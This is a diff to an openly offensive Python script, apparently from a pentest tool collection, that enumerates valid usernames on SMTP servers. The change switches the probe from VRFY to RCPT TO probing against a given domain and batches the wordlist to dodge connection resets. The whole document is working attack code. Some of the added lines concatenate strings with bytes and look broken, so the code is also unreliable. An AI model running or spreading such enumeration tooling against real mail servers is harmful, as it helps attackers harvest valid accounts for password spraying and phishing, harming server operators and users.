@@ -1,11 +1,12 @@
 #!/usr/bin/python3
 #
-# Simple script intended to abuse SMTP server's VRFY command to leak
+# Simple script intended to abuse SMTP server's RCPT TO command to leak
 # usernames having accounts registered within it.
 #
 # Mariusz B., 2016
 #
-# Converted to Python3 by kmahyyg, 20230404
+# Converted to Python3 by kmahyyg, 20230404. Original version is "VRFY".
+# Refactored to "RCPT TO" by kmahyyg, 20230920
 #
 # Designed to split per 18 names, since my environment per 20 failed attempts 
 # will trigger connection reset.
@@ -37,7 +38,7 @@ def interpret_smtp_status_code(resp):
     else:
         return '({} code unknown)'.format(code)
 
-def vrfy(server, username, port, timeout, brute=False):
+def rcptto(server, username, port, timeout, domain, brute=False):
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
@@ -50,8 +51,10 @@ def vrfy(server, username, port, timeout, brute=False):
 
     try:
         print('[+] Service banner: "{}"'.format(s.recv(1024).strip()))
-        s.send('HELO test@test.com\r\n'.encode())
+        s.send('HELO test@'+ domain+'\r\n'.encode())
         print('[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).decode().strip())
+        s.send('MAIL FROM: test@'+domain+'\r\n'.encode())
+        print('[>] Response for MAIL HELO from {}:{} - '.format(server, port) + s.recv(1024).decode().strip())
 
     except socket.error as e:
         print('[!] Failed at initial session setup: "{}"'.format(str(e)))
@@ -64,11 +67,11 @@ def vrfy(server, username, port, timeout, brute=False):
     if brute:
         for i in range(len(username)):
             user = username[i]
-            payload = 'VRFY ' + user + '\r\n'
+            payload = 'RCPT TO:' + user + '@' + domain + '\r\n'
             try:
                 s.send(payload.encode())
                 res = s.recv(1024).decode().strip()
-                print('({}/{}) Server: {}:{} | VRFY {} | Result: [{}]'.format(
+                print('({}/{}) Server: {}:{} | RCPT {} | Result: [{}]'.format(
                     i+1, len(username), server, port, user, interpret_smtp_status_code(res)))
             except Exception as e:
                 print(e)
@@ -89,14 +92,18 @@ def vrfy(server, username, port, timeout, brute=False):
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        print('[?] Usage: smtpvrfy.py <smtpserver> [username|wordlist] [timeout]')
+        print('[?] Usage: smtprcptto.py <smtpserver> <domain-name> [username|wordlist] [timeout]')
         print('\t(to specify a port provide it after a colon \':\' in server parameter)')
         sys.exit(0)
 
     server = sys.argv[1]
+    domain = sys.argv[2]
     port = 25 if ':' not in server else int(server[server.find(':')+1:])
-    username = sys.argv[2] if len(sys.argv) >= 3 else DEFAULT_WORDLIST
-    timeout = DEFAULT_TIMEOUT if len(sys.argv) < 4 else int(sys.argv[3])
+    username = sys.argv[3] if len(sys.argv) >= 4 else DEFAULT_WORDLIST
+    timeout = DEFAULT_TIMEOUT if len(sys.argv) < 5 else int(sys.argv[4])
+
+    if domain == "" :
+        raise AssertionError("Domain is not provided.")
 
     if os.path.isfile(username):
         names = [] 
@@ -108,6 +115,6 @@ if __name__ == '__main__':
         split_gate = 18
         splited_names = [names[i:i+split_gate] for i in range(0, len(names), split_gate)]
         for per_names in splited_names:
-            vrfy(server, per_names, port, timeout, brute=True)
+            rcptto(server, per_names, port, timeout, domain, brute=True)
     else:
-        vrfy(server, username, port, timeout)
+        rcptto(server, username, port, timeout, domain)
